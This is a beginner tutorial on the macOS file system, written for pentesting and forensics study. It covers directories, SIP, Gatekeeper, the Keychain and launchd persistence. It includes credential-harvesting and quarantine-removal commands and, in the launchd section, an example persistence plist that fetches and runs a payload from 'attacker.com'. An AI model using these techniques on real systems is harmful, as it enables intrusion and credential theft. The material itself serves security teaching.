# macOS File System

> **Zero2Root** | Basics Series | kodoktheGr3at | 2026

---

<!-- LC-CURRICULUM-START -->
> **Curriculum ID:** `LC-007` | **Phase 0:** Foundations
> **Est. study:** 4-5h | **Level:** Beginner
> **Prerequisites:** LC-001
> **Book map:** Ward, How Linux Works (Unix comparison); Apple platform guides
<!-- LC-CURRICULUM-END -->

## Table of Contents

| # | Topic |
|---|-------|
| 1 | Overview: What is the macOS File System |
| 2 | Full directory tree |
| 3 | Root directory |
| 4 | `/Applications`: Installed applications |
| 5 | `/System`: Core OS (SIP-protected) |
| 6 | `/Library` and `~/Library`: App and system support data |
| 7 | `/Users`: User home directories |
| 8 | `/private/etc`: Unix-style configuration |
| 9 | `/private/var`: Variable data and logs |
| 10 | `/private/tmp`: Temporary files |
| 11 | `/bin` and `/sbin`: Essential Unix binaries |
| 12 | `/usr`: Unix shared resources |
| 13 | `.app` bundles: application package structure |
| 14 | SIP and Gatekeeper: macOS system protections |
| 15 | Keychain: credential storage |
| 16 | LaunchAgents and LaunchDaemons: persistence and startup |
| 17 | Volumes and APFS: modern volume structure |
| 18 | Security note: sensitive locations and defensive hardening |
| 19 | Practical recon workflow |

---

## Key Terms

You'll see these words throughout the lesson.

| Term | Plain meaning |
|:---|:---|
| APFS | Apple File System: the modern macOS file system (snapshots, encryption) |
| Volume | A mountable storage container; macOS shows them under `/Volumes` |
| Path | A file's location; macOS is Unix-style with forward slashes (`/Users/alex`) |
| Bundle | A folder macOS treats as a single item, like an `.app` application |
| SIP | System Integrity Protection: keeps even root from altering protected system files |
| Gatekeeper | The check that only lets signed/notarized apps run by default |
| Quarantine | A flag macOS puts on downloaded files to trigger that check |
| Home / Library | Your files live in `/Users/<name>`; app settings live in its `Library` |

---

## 1. Overview: What Is the macOS File System

The macOS file system is built on a Unix (BSD/Darwin) foundation, so its structure resembles Linux: one single directory tree from `/`. macOS adds Apple-specific layers on top of that, though, such as `/Applications`, `/Library`, and the `.app` bundle format that plain Linux doesn't have.

The modern filesystem is APFS (Apple File System), which replaced the older HFS+. APFS supports:

- Snapshots for instant filesystem state recovery
- Volume groups, where multiple volumes share one physical partition (Data and System have been split since macOS Catalina)
- Native encryption, with FileVault fully integrated
- Copy-on-write and space sharing

Since macOS Catalina (10.15), the system enforces a read-only System volume: the `/System` volume is split from the `Data` volume and protected by SIP (System Integrity Protection).

Why it matters for security work:

- Knowing credential locations (Keychain, browser data) is a reconnaissance target.
- Understanding SIP and sandboxing tells you the boundaries of privilege escalation.
- Knowing where the unified logs live matters for forensics and incident response.
- Understanding LaunchAgents and LaunchDaemons matters for persistence and malware analysis.
- Knowing the `.app` bundle structure matters for macOS malware analysis.

---

## 2. File Tree: Full Directory Structure

```
/                                      ← Root of the entire file system (Data volume, writable)
│
├── Applications/                      ← User-installed & built-in apps (.app bundles)
│   ├── Safari.app/
│   ├── Utilities/                     ← Built-in utility apps
│   │   ├── Terminal.app/
│   │   ├── Activity Monitor.app/
│   │   ├── Console.app/
│   │   ├── Keychain Access.app/
│   │   └── Disk Utility.app/
│   └── ThirdPartyApp.app/
│
├── System/                            ← Read-only, SIP-protected (sealed system volume)
│   ├── Applications/                  ← Apple's built-in apps (Catalina+)
│   ├── Library/                       ← System-level frameworks, daemons, extensions
│   │   ├── LaunchDaemons/             ← System-wide background services (persistence!)
│   │   ├── LaunchAgents/              ← System-wide per-user agents
│   │   ├── Extensions/                ← Kernel extensions (kext) — legacy
│   │   ├── Frameworks/                ← System frameworks
│   │   ├── CoreServices/              ← Finder, SystemUIServer, etc.
│   │   ├── PrivateFrameworks/
│   │   └── Keychains/                 ← System root certificates
│   └── Volumes/
│       └── Data/                      ← Symlinked to writable data volume (Catalina+)
│
├── Library/                           ← System-wide application support (not user-specific)
│   ├── Application Support/
│   ├── LaunchAgents/                  ← Third-party agents (login items, persistence!)
│   ├── LaunchDaemons/                 ← Third-party daemons (persistence!)
│   ├── Logs/                          ← System & app logs
│   │   ├── DiagnosticReports/         ← Crash reports (forensics!)
│   │   └── CrashReporter/
│   ├── Preferences/                   ← System-wide plist preference files
│   ├── Caches/
│   ├── Extensions/                    ← Legacy kernel extensions
│   ├── StartupItems/                  ← Legacy startup items (pre-launchd)
│   ├── Keychains/                     ← System keychain
│   ├── WebServer/                     ← Legacy Apache web root (older macOS)
│   └── Printers/
│
├── Users/                             ← All user home directories
│   ├── Shared/                        ← Shared between all users
│   │
│   ├── alice/                         ← Regular user's home directory
│   │   ├── Desktop/
│   │   ├── Documents/
│   │   ├── Downloads/
│   │   ├── Movies/
│   │   ├── Music/
│   │   ├── Pictures/
│   │   ├── Public/                    ← Drop Box for file sharing
│   │   ├── .bash_history              ← Command history! (hidden)
│   │   ├── .zsh_history               ← Zsh history (default shell since Catalina)
│   │   ├── .ssh/                      ← SSH keys (hidden)
│   │   │   ├── id_rsa                 ← Private key
│   │   │   ├── id_ed25519
│   │   │   └── known_hosts
│   │   └── Library/                   ← PER-USER app data (hidden by default!)
│   │       ├── Application Support/   ← App data, configs, sometimes credentials
│   │       │   ├── Slack/
│   │       │   ├── 1Password/
│   │       │   └── Google/Chrome/
│   │       ├── Preferences/           ← .plist files — app & system settings
│   │       │   └── com.apple.finder.plist
│   │       ├── Caches/                ← App caches
│   │       ├── Cookies/               ← Browser cookies (legacy location)
│   │       ├── Keychains/             ← User's login.keychain-db!
│   │       │   └── login.keychain-db  ← Saved passwords, certs, keys!
│   │       ├── LaunchAgents/          ← Per-user persistence!
│   │       ├── Mail/                  ← Local Mail.app data
│   │       ├── Messages/              ← iMessage database (chat.db)
│   │       ├── Safari/                ← Safari history, bookmarks
│   │       │   └── History.db
│   │       ├── Logs/                  ← Per-app logs
│   │       ├── CloudStorage/          ← iCloud Drive, Dropbox, etc.
│   │       └── Containers/            ← Sandboxed app data (per bundle ID)
│   │
│   └── bob/
│       └── (same structure as above)
│
├── private/                           ← Actual location of /etc, /tmp, /var (symlinked from root)
│   ├── etc/                           ← Unix-style system config (symlink target of /etc)
│   │   ├── passwd                     ← Legacy user list (NOT primary source — see dscl)
│   │   ├── hosts                      ← Static hostname resolution
│   │   ├── ssh/
│   │   │   └── sshd_config
│   │   ├── sudoers                    ← Sudo permissions
│   │   ├── pf.conf                    ← Packet filter firewall config
│   │   └── crontab                    ← Legacy cron (launchd preferred now)
│   ├── var/                           ← Variable data (symlink target of /var)
│   │   ├── log/
│   │   │   ├── system.log             ← Legacy system log (pre-unified logging)
│   │   │   ├── install.log            ← Installation events
│   │   │   ├── wifi.log
│   │   │   └── DiagnosticMessages/
│   │   ├── db/
│   │   │   └── dslocal/               ← Local user account database (Open Directory)
│   │   │       └── nodes/Default/users/
│   │   ├── folders/                   ← Per-user temp & cache (randomized paths!)
│   │   ├── root/                      ← root user's home (rarely used directly)
│   │   └── audit/                     ← BSM security audit logs
│   └── tmp/                           ← Temporary files (symlink target of /tmp)
│
├── bin/                                ← Essential Unix binaries (bash, ls, cp, cat...)
├── sbin/                               ← Essential system admin binaries
│
├── usr/                                 ← Unix shared resources
│   ├── bin/                             ← Most command-line tools
│   ├── sbin/
│   ├── lib/
│   ├── local/                           ← Homebrew (Intel) typically lives here
│   │   └── bin/
│   └── share/
│
├── opt/                                  ← Homebrew (Apple Silicon) typically lives here
│   └── homebrew/
│       └── bin/
│
├── etc -> private/etc                    ← Symlink
├── tmp -> private/tmp                    ← Symlink
├── var -> private/var                    ← Symlink
│
├── Volumes/                              ← Mounted external/network volumes
│   ├── Macintosh HD/                     ← Self-reference to boot volume
│   └── USB_DRIVE/
│
├── .Spotlight-V100/                      ← Spotlight search index (hidden)
├── .fseventsd/                           ← Filesystem event logs (forensics!)
├── .Trashes/                             ← Trash for non-boot volumes
├── .DS_Store                             ← Per-folder Finder metadata (forensics!)
│
└── cores/                                ← Core dump files (crash forensics)
```

---

## 3. `/` — Root Directory (Synthetic Firmlink View)

Since macOS Catalina, the `/` you see is actually a merged view (firmlink) of two separate volumes: the System volume (read-only, cryptographically sealed) and the Data volume (writable). Apple uses firmlinks, not regular symlinks, to make both appear as a single directory tree, transparent to the user.

```bash
# Navigate to root
$ cd /
$ ls -la /

# Check the volume structure
$ diskutil list
/dev/disk3 (synthesized):
   #:                       TYPE NAME                    SIZE       IDENTIFIER
   0:      APFS Container Scheme -                       +494.4 GB  disk3
                                 Physical Store disk0s2
   1:                APFS Volume Macintosh HD - Data      300.1 GB   disk3s1
   2:                APFS Volume Macintosh HD             15.3 GB    disk3s5  (System, sealed)
   3:                APFS Volume Preboot                  500.0 MB   disk3s2
   4:                APFS Volume Recovery                 1.1 GB     disk3s3
   5:                APFS Volume VM                       1.1 GB     disk3s6

# View firmlinks mapping
$ cat /usr/share/firmlinks
/AppleInternal	AppleInternal
/Applications	Applications
/Library	Library
/System/Library/Caches	System/Library/Caches
/Users	Users
/Volumes	Volumes
...

# Check if SIP is enabled
$ csrutil status
System Integrity Protection status: enabled.
```

---

## 4. `/Applications` — Installed Applications

`/Applications` is the standard location for installed applications on macOS, both Apple's own and third-party. Each application is a `.app` bundle: actually a folder containing the executable, resources, and metadata, but displayed by Finder as a single file.

```bash
# List installed applications
$ ls /Applications

# List applications with details
$ ls -la /Applications/*.app

# Find all .app bundles system-wide
$ find / -name "*.app" -maxdepth 4 2>/dev/null

# Check app's bundle identifier
$ defaults read /Applications/Safari.app/Contents/Info.plist CFBundleIdentifier
com.apple.Safari

# Check code signature (important for security analysis)
$ codesign -dv --verbose=4 /Applications/Safari.app

# List running applications
$ osascript -e 'tell application "System Events" to get name of every process'

# System-wide installed application inventory (via system_profiler)
$ system_profiler SPApplicationsDataType
```

| Path | Contents | Pentest value |
|------|----------|----------------|
| `/Applications/*.app` | User-level applications | Medium |
| `/System/Applications/*.app` | Apple built-in apps | Low |
| `*.app/Contents/MacOS/` | Executable binary | High |
| `*.app/Contents/Info.plist` | App metadata | Medium |
| `*.app/Contents/Resources/` | Assets & resources | Low |

---

## 5. `/System` — Core OS (SIP-Protected)

`/System` is the heart of the macOS operating system, containing all of Apple's core frameworks, daemons, and components. Since macOS Big Sur, this volume is read-only and cryptographically sealed. Even root cannot write here without disabling SIP first.

`/System/Library` is different from `/Library` (system-level but not SIP-protected) and `~/Library` (per-user). Don't confuse them.

```bash
# Attempt to write to /System (will fail with SIP enabled)
$ sudo touch /System/test.txt
touch: /System/test.txt: Read-only file system

# View SIP-protected paths
$ csrutil status
System Integrity Protection status: enabled.

# List system LaunchDaemons (persistence-relevant, but SIP-protected)
$ ls /System/Library/LaunchDaemons/ | head -10

# View kernel extensions (legacy, mostly replaced by System Extensions)
$ ls /System/Library/Extensions/ | head -10
$ kextstat                       # list loaded kernel extensions (deprecated cmd)
$ kmutil showloaded              # modern equivalent

# Check System Extensions (modern replacement for kexts)
$ systemextensionsctl list

# View CoreServices (Finder, Dock, etc.)
$ ls /System/Library/CoreServices/
```

| Subdirectory | Contents |
|--------------|----------|
| `/System/Library/LaunchDaemons` | Apple system services |
| `/System/Library/Frameworks` | Core macOS frameworks |
| `/System/Library/CoreServices` | Finder, SystemUIServer |
| `/System/Library/Extensions` | Kernel extensions (legacy) |
| `/System/Library/Keychains` | System root certificates |

---

## 6. `/Library` and `~/Library` — Application Support Data

There are two Library locations with different purposes:

- `/Library`: system-level data and preferences that apply to all users. It's not SIP-protected, so root can write here.
- `~/Library`: user-level data and preferences, hidden from Finder by default since macOS 10.7.

`~/Library` is a forensic goldmine. It contains keychains, browser caches, messaging databases, and per-user application preferences.

```bash
# Show hidden ~/Library in Finder (one-time)
$ chflags nohidden ~/Library

# Or navigate directly via Terminal (always accessible)
$ cd ~/Library
$ ls -la

# ── HIGH-VALUE FORENSIC LOCATIONS ────────────────────────────────

# Preferences (plist files — app & system settings)
$ ls ~/Library/Preferences/
$ defaults read com.apple.finder

# Saved passwords & certificates (requires unlock / Touch ID)
$ ls ~/Library/Keychains/
$ security list-keychains
$ security find-generic-password -ga "AccountName"   # prompts for keychain password

# Browser data (Safari)
$ sqlite3 ~/Library/Safari/History.db "SELECT url FROM history_items LIMIT 10;"

# Chrome data
$ ls ~/Library/Application\ Support/Google/Chrome/Default/

# iMessage database (forensics gold)
$ sqlite3 ~/Library/Messages/chat.db "SELECT text FROM message LIMIT 10;"

# Application crash logs
$ ls ~/Library/Logs/DiagnosticReports/

# LaunchAgents — persistence!
$ ls ~/Library/LaunchAgents/

# Login items (apps that start at login)
$ osascript -e 'tell application "System Events" to get the name of every login item'

# Quarantine database (downloaded file history — Gatekeeper)
$ sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 \
    "SELECT LSQuarantineDataURLString FROM LSQuarantineEvent LIMIT 10;"
```

### High-Value Files in `~/Library/`

| Path | Contents | Pentest value |
|------|----------|----------------|
| `Keychains/login.keychain-db` | Saved passwords & certs | Critical |
| `Application Support/` | App data & config | High |
| `Safari/History.db` | Browsing history | High |
| `Messages/chat.db` | iMessage database | High |
| `Preferences/*.plist` | App/system settings | Medium |
| `LaunchAgents/` | Per-user persistence | High |
| `Logs/DiagnosticReports/` | Crash reports | Medium |
| `Containers/` | Sandboxed app data | High |
| `CloudStorage/` | iCloud Drive, Dropbox, etc. | Medium |

---

## 7. `/Users` — User Home Directories

`/Users` contains the home directory for each user on the system, equivalent to `/home` on Linux. macOS uses Zsh as the default shell since Catalina (previously Bash). Each user has standard folders (Desktop, Documents, etc.) plus a hidden `~/Library`.

```bash
# List all user home directories
$ ls /Users
$ dscl . list /Users                     # list all user accounts (incl. system accounts)
$ dscl . list /Users | grep -v "^_"       # filter out system/service accounts

# Navigate to a user's home
$ cd /Users/alice
$ ls -la

# Shell history (gold mine!)
$ cat ~/.zsh_history                      # Zsh (default since Catalina)
$ cat ~/.bash_history                     # Bash (if used)

# Recently opened files / Quick Look cache
$ sqlite3 ~/Library/Application\ Support/com.apple.sharedfilelist/*.sfl2

# SSH keys
$ ls -la ~/.ssh/
$ cat ~/.ssh/id_rsa.pub

# Get info about all local user accounts
$ dscl . -list /Users UniqueID
$ dscl . -read /Users/alice

# Check admin group membership
$ dscl . -read /Groups/admin GroupMembership

# Foreach user, check shell history
$ for user in $(ls /Users); do
    echo "=== $user ==="
    sudo cat "/Users/$user/.zsh_history" 2>/dev/null
done
```

### High-Value Files in `/Users/<username>/`

| Path | Contents | Pentest value |
|------|----------|----------------|
| `.zsh_history` | Zsh command history | Critical |
| `.bash_history` | Bash command history | Critical |
| `.ssh/id_rsa` / `id_ed25519` | SSH private key | High |
| `Library/Keychains/` | Stored credentials | Critical |
| `Desktop/` & `Documents/` | User files | Medium |
| `Public/` | Shared folder (Drop Box) | Medium |

---

## 8. `/private/etc` — Unix-Style Configuration

`/etc` on macOS is actually a symlink to `/private/etc`. It contains classic Unix-style configuration files. Importantly, macOS does not use `/etc/passwd` as the primary source for the user list. That's replaced by Open Directory / dscl (Directory Service), though `/etc/passwd` still exists for compatibility.

```bash
# Confirm /etc is a symlink
$ ls -la / | grep etc
lrwxr-xr-x  1 root  wheel  11 etc -> private/etc

# Static hostname resolution
$ cat /etc/hosts

# SSH daemon configuration
$ cat /etc/ssh/sshd_config

# Sudoers
$ sudo cat /etc/sudoers

# Packet filter firewall config
$ cat /etc/pf.conf
$ sudo pfctl -s rules              # show active firewall rules

# PRIMARY user database is Open Directory, NOT /etc/passwd:
$ dscl . list /Users
$ dscl . read /Users/alice UniqueID
$ dscl . read /Users/alice UserShell

# /etc/passwd is mostly a compatibility stub on modern macOS
$ cat /etc/passwd
##
# User Database
# Note that this file is consulted directly only when the system is running
# in single-user mode...
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
daemon:*:1:1:System Services:/var/root:/usr/bin/false
```

| File | Contents | Pentest value |
|------|----------|----------------|
| `/etc/hosts` | Static hostname resolution | Medium |
| `/etc/ssh/sshd_config` | SSH daemon config | High |
| `/etc/sudoers` | Sudo permissions | Critical |
| `/etc/pf.conf` | Firewall configuration | High |
| `/etc/passwd` | Compatibility stub (not primary source) | Low |

---

## 9. `/private/var` — Variable Data & Logs

`/var` (symlinked to `/private/var`) contains frequently changing data. Since macOS Sierra, most logging moved to the Unified Logging System (accessed via the `log` command), rather than flat text files like the classic `syslog`. But some legacy logs still exist here.

```bash
# ── UNIFIED LOGGING SYSTEM (modern, primary method) ───────────────
$ log show --last 1h                            # show logs from last hour
$ log show --predicate 'eventMessage contains "ssh"' --last 1h
$ log stream                                      # live stream of system logs
$ log stream --predicate 'process == "sshd"'      # filter by process
$ log show --predicate 'subsystem == "com.apple.securityd"' --last 1d

# Authentication-related logs
$ log show --predicate 'eventMessage contains "authentication"' --last 1h

# ── LEGACY LOG FILES (still present) ───────────────────────────────
$ cat /var/log/system.log              # legacy system log (pre-Sierra style)
$ cat /var/log/install.log             # installation events
$ cat /var/log/wifi.log                # Wi-Fi connection events

# ── LOCAL USER DATABASE (Open Directory backend) ───────────────────
$ ls /var/db/dslocal/nodes/Default/users/
$ sudo plutil -p /var/db/dslocal/nodes/Default/users/alice.plist

# ── PER-USER TEMP/CACHE (randomized path!) ──────────────────────────
$ echo $TMPDIR
/var/folders/zz/zyxvpxvq6csfxvn_n0000000000/T/

# ── SECURITY AUDIT LOGS (BSM format) ────────────────────────────────
$ sudo praudit -l /var/audit/[timestamp]
```

### Key Subdirectories in `/var`

| Directory | Contents |
|-----------|----------|
| `/var/log` | Legacy & install logs |
| `/var/db/dslocal` | Local user database |
| `/var/folders` | Per-user temp/cache (randomized) |
| `/var/audit` | Security audit logs (BSM) |
| `/var/root` | Root's home (rarely used) |

---

## 10. `/private/tmp` — Temporary Files

`/tmp` (symlinked to `/private/tmp`) is the classic world-writable temp location, but macOS more often uses a randomized per-user `$TMPDIR` (under `/var/folders/...`) for modern applications. Both locations are worth checking during post-exploitation.

```bash
# Classic /tmp
$ ls -la /tmp/
drwxrwxrwt  root wheel  tmp     ← "t" = sticky bit

# Modern randomized per-user temp directory
$ echo $TMPDIR
/var/folders/zz/zyxvpxvq6csfxvn_n0000000000/T/
$ ls -la "$TMPDIR"

# Find ALL per-user temp dirs (useful in multi-user forensics)
$ ls -la /var/folders/

# Common attacker artifacts to check:
$ ls -la /tmp/ "$TMPDIR" 2>/dev/null
# - Dropped payloads, downloaded scripts
# - Compiled exploit binaries
# - Persistence staging plists before being moved to LaunchAgents
```

Pentesting note: because `$TMPDIR` is randomized per user and changes every session, many security tools and analysts miss it. Always check `echo $TMPDIR` while in a user's shell session.

---

## 11. `/bin` & `/sbin` — Essential Unix Binaries

Just like Linux, `/bin` and `/sbin` contain the most essential Unix binaries. Since macOS Catalina+, though, this location resides on the read-only System volume, and several classic BSD tools (like `netstat`, `ifconfig`) are increasingly superseded by modern Apple tools (`lsof -i`, `networksetup`, `scutil`).

```bash
$ ls /bin
bash    cat    chmod   cp     csh    date
echo    kill   ln      ls     mkdir  mv
ps      pwd    rm      sh     zsh    ...

$ ls /sbin
fsck    ifconfig   mount    ping    reboot
route   shutdown   ...

# macOS-specific networking tools (preferred over legacy ones)
$ networksetup -listallhardwareports
$ scutil --dns                       # DNS configuration
$ scutil --nwi                       # network interface info
$ lsof -i -P                         # listening ports & connections (netstat replacement)
$ system_profiler SPNetworkDataType  # full network hardware report
```

| Binary | Function |
|--------|----------|
| `dscl` | Manage Directory Service |
| `scutil` | System & network config |
| `csrutil` | Control SIP |
| `codesign` | Verify code signatures |
| `spctl` | Control Gatekeeper |
| `security` | Access Keychain |

---

## 12. `/usr` — Unix Shared Resources

`/usr` contains the majority of additional Unix command-line tools. Important note: `/usr/bin` and `/usr/sbin` are now read-only (SIP-protected) on modern macOS. You can no longer add binaries directly to `/usr/bin` like in the past. Instead, use Homebrew, which installs to `/usr/local` (Intel Mac) or `/opt/homebrew` (Apple Silicon).

```bash
$ ls /usr
bin  lib  libexec  local  sbin  share  std

# /usr/bin is SIP-protected
$ touch /usr/bin/test
touch: /usr/bin/test: Operation not permitted

# Homebrew locations (package manager — not pre-installed!)
$ which brew
/opt/homebrew/bin/brew              # Apple Silicon (M1/M2/M3/M4)
/usr/local/bin/brew                 # Intel Mac

$ brew list                          # installed packages
$ brew install nmap                  # install a tool

# Check architecture
$ uname -m
arm64        # Apple Silicon
x86_64       # Intel
```

| Directory | Notes |
|-----------|-------|
| `/usr/bin` | SIP-protected, read-only |
| `/usr/local` | Homebrew (Intel) |
| `/opt/homebrew` | Homebrew (Apple Silicon) |

---

## 13. `.app` Bundles — Application Package Structure

Every macOS application is actually a folder with a `.app` extension, appearing as a single file in Finder but containing a complete internal structure. Understanding this structure matters for macOS malware analysis and reverse engineering.

```
SomeApp.app/
└── Contents/
    ├── Info.plist              ← App metadata (bundle ID, version, permissions)
    ├── MacOS/
    │   └── SomeApp              ← The actual executable binary
    ├── Resources/                ← Icons, images, localized strings
    │   └── AppIcon.icns
    ├── Frameworks/                ← Bundled frameworks/libraries
    ├── PlugIns/                    ← App extensions/plugins
    ├── _CodeSignature/              ← Code signing data
    │   └── CodeResources
    └── embedded.provisionprofile   ← Provisioning profile (if signed)
```

```bash
# Inspect an app bundle's contents
$ ls -la /Applications/Safari.app/Contents/

# View Info.plist (metadata: bundle ID, version, permissions requested)
$ plutil -p /Applications/Safari.app/Contents/Info.plist
$ defaults read /Applications/Safari.app/Contents/Info.plist

# Find the actual executable
$ file /Applications/Safari.app/Contents/MacOS/Safari

# Check code signature & entitlements (security analysis)
$ codesign -dv --verbose=4 /Applications/Safari.app
$ codesign -d --entitlements - /Applications/Safari.app

# Verify Gatekeeper assessment
$ spctl -a -vvv /Applications/Safari.app

# Check for unsigned / ad-hoc signed apps (suspicious!)
$ find /Applications -maxdepth 1 -name "*.app" -exec sh -c \
    'codesign -dv "{}" 2>&1 | grep -q "not signed" && echo "{}"' \;

# Extract & analyze a binary inside a bundle
$ otool -L /Applications/Safari.app/Contents/MacOS/Safari    # linked libraries
$ otool -h /Applications/Safari.app/Contents/MacOS/Safari    # mach-o header

# Check architecture (universal binary support)
$ lipo -info /Applications/Safari.app/Contents/MacOS/Safari
```

| Path inside `.app` | Contents | Pentest value |
|---------------------|----------|----------------|
| `Contents/MacOS/` | Main executable binary | Critical |
| `Contents/Info.plist` | Metadata & permissions | High |
| `Contents/_CodeSignature/` | Code signing data | High |
| `Contents/Resources/` | Assets (icons, images) | Low |
| `Contents/Frameworks/` | Embedded libraries | Medium |

---

## 14. SIP & Gatekeeper — macOS System Protections

macOS has several unique protection layers not found in classic Linux/Windows, and they heavily affect how pentesting is done:

- SIP (System Integrity Protection): prevents modification of `/System`, `/bin`, `/sbin`, `/usr` even by root.
- Gatekeeper: verifies signature and notarization before an app runs for the first time.
- TCC (Transparency, Consent, and Control): requests user permission for camera, microphone, personal files, and so on.
- Notarization: Apple scans apps for malware before allowing distribution outside the App Store.

```bash
# ── SIP ────────────────────────────────────────────────────────────
$ csrutil status
System Integrity Protection status: enabled.

# Disabling SIP requires Recovery Mode (not possible from normal boot):
# 1. Reboot, hold Cmd+R to enter Recovery
# 2. Open Terminal from Utilities menu
# 3. csrutil disable
# 4. Reboot

# ── GATEKEEPER ─────────────────────────────────────────────────────
$ spctl --status
assessments enabled

$ spctl -a -vvv /Applications/SomeApp.app    # check if app would be allowed to run

# Remove quarantine attribute (common bypass technique — known to attackers!)
$ xattr -d com.apple.quarantine /path/to/file.app
$ xattr -l /path/to/file.app                  # list all extended attributes

# ── TCC (PRIVACY PERMISSIONS) ────────────────────────────────────────
# TCC database (per-user) — tracks which apps have which permissions
$ sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client,auth_value,service FROM access;"

# System-wide TCC database (requires Full Disk Access to read)
$ sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client,auth_value,service FROM access;"

# Reset TCC permissions for an app
$ tccutil reset All com.somecompany.someapp

# ── NOTARIZATION CHECK ─────────────────────────────────────────────
$ spctl -a -t exec -vv /Applications/SomeApp.app
$ codesign --test-requirement="=notarized" --verify --verbose /Applications/SomeApp.app

# ── FULL DISK ACCESS (relevant for security tools & malware) ───────
# Check which apps have Full Disk Access (System Settings > Privacy)
# Programmatically:
$ sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles';"
```

### macOS Protection Layers Summary

| Protection | Function | Bypass relevance |
|------------|----------|--------------------|
| SIP | Protect core system files | Requires Recovery Mode |
| Gatekeeper | Verify app signatures | `xattr -d` quarantine removal |
| TCC | Privacy permissions (camera, files) | Social engineering / TCC.db abuse |
| Notarization | Apple malware scanning | Ad-hoc signing evasion |

---

## 15. Keychain — Credential Storage

Keychain is macOS's built-in encrypted credential storage system: it stores Wi-Fi passwords, app passwords, certificates, and private keys. It's the equivalent of Windows' Credential Manager, and it's the number one target in macOS post-exploitation.

```bash
# List all keychains
$ security list-keychains

# Default keychain location
$ ls -la ~/Library/Keychains/
login.keychain-db

# Dump keychain info (won't show passwords without unlock)
$ security dump-keychain ~/Library/Keychains/login.keychain-db

# Find a specific password (prompts for keychain unlock / Touch ID)
$ security find-generic-password -s "ServiceName" -g

# Find Wi-Fi password (common pentest demo)
$ security find-generic-password -D "AirPort network password" -a "WiFiName" -w

# Find internet passwords (websites)
$ security find-internet-password -s "github.com" -g

# Export all certificates
$ security find-certificate -a -p ~/Library/Keychains/login.keychain-db

# Unlock keychain (requires password)
$ security unlock-keychain ~/Library/Keychains/login.keychain-db

# Keychain access via GUI (for comparison)
$ open -a "Keychain Access"

# System keychain (used by system services, root-readable)
$ ls -la /Library/Keychains/
$ sudo security dump-keychain /Library/Keychains/System.keychain
```

Pentesting note: Keychain is protected by the user's login password (or Touch ID). Without that password, dumping the keychain only shows metadata, not the actual secrets. Techniques like keychain dumping via memory (Mimikatz-style tooling for macOS, such as `Chainbreaker`) are needed if you only have non-interactive access.

| Keychain | Location | Contents |
|----------|----------|----------|
| Login Keychain | `~/Library/Keychains/login.keychain-db` | User passwords, Wi-Fi, app credentials |
| System Keychain | `/Library/Keychains/System.keychain` | System-level credentials |
| iCloud Keychain | Synced via iCloud | iCloud-synced passwords |

---

## 16. LaunchAgents & LaunchDaemons — Persistence & Startup

macOS does not use cron as the primary mechanism for modern scheduled tasks or startup. That's replaced by launchd, configured via `.plist` files in several locations. This is the number one persistence vector on macOS, for both legitimate software and malware.

Key difference:

- LaunchAgents run as the logged-in user and have GUI access.
- LaunchDaemons run as root, without a user session, as a background service.

```bash
# ── FOUR PERSISTENCE LOCATIONS (in order of privilege) ──────────────
~/Library/LaunchAgents/                  # per-user, no admin needed
/Library/LaunchAgents/                   # all-users, needs admin to write
/Library/LaunchDaemons/                  # root-level daemon, needs admin
/System/Library/LaunchDaemons/           # Apple's own (SIP-protected)

# List all LaunchAgents/Daemons across the system
$ ls ~/Library/LaunchAgents/
$ ls /Library/LaunchAgents/
$ ls /Library/LaunchDaemons/

# View a launchd plist
$ cat ~/Library/LaunchAgents/com.example.agent.plist
$ plutil -p ~/Library/LaunchAgents/com.example.agent.plist

# List all currently loaded launchd jobs
$ launchctl list
$ launchctl list | grep -v com.apple    # filter out Apple's own (focus on 3rd-party)

# Load / unload a launch agent manually
$ launchctl load ~/Library/LaunchAgents/com.example.agent.plist
$ launchctl unload ~/Library/LaunchAgents/com.example.agent.plist

# Example malicious-style persistence plist structure:
cat << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update.helper</string>     <!-- disguised name -->
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>curl -s http://attacker.com/payload | bash</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>3600</integer>
</dict>
</plist>
EOF

# ── LOGIN ITEMS (GUI-visible startup apps) ──────────────────────────
$ osascript -e 'tell application "System Events" to get the name of every login item'

# ── LEGACY CRON (still works, but rarely used by modern macOS) ─────
$ crontab -l
$ sudo crontab -l -u root

# ── PERIODIC SCRIPTS (built-in maintenance, rarely abused but exists) ─
$ ls /etc/periodic/daily/
$ ls /etc/periodic/weekly/
$ ls /etc/periodic/monthly/

# ── AUDIT FOR SUSPICIOUS PERSISTENCE (quick triage) ──────────────────
$ for dir in ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons; do
    echo "=== $dir ==="
    ls -la "$dir" 2>/dev/null
done
```

### Persistence Location Priority Table

| Location | Runs as | Notes | Pentest value |
|----------|---------|-------|----------------|
| `~/Library/LaunchAgents/` | Current user | No admin needed | Critical |
| `/Library/LaunchAgents/` | Any logged-in user | Needs admin to write | Critical |
| `/Library/LaunchDaemons/` | root | Needs admin, runs without login | Critical |
| `/System/Library/LaunchDaemons/` | root | SIP-protected (Apple only) | Low (defended) |
| Login Items | Current user | Visible in System Settings | High |

---

## 17. Volumes & APFS — Modern Volume Structure

`/Volumes` contains all mounted external drives, network shares, and disk images, similar to `/mnt` and `/media` on Linux. The boot drive (`Macintosh HD`) also appears here as a self-reference.

```bash
# List mounted volumes
$ ls /Volumes/
$ diskutil list

# Mount a disk image (.dmg)
$ hdiutil attach SomeApp.dmg

# Unmount a volume
$ diskutil unmount /Volumes/USB_DRIVE
$ diskutil eject /Volumes/USB_DRIVE

# Check disk usage
$ df -h

# View APFS container details
$ diskutil apfs list

# Create an APFS snapshot (used by Time Machine)
$ tmutil snapshot

# List Time Machine snapshots
$ tmutil listlocalsnapshots /

# Check FileVault encryption status
$ fdesetup status
FileVault is On.

# Mount a remote SMB/AFP share
$ mount_smbfs //user@server/share /Volumes/share
```

| Path | Function |
|------|----------|
| `/Volumes/` | External drives & network shares |
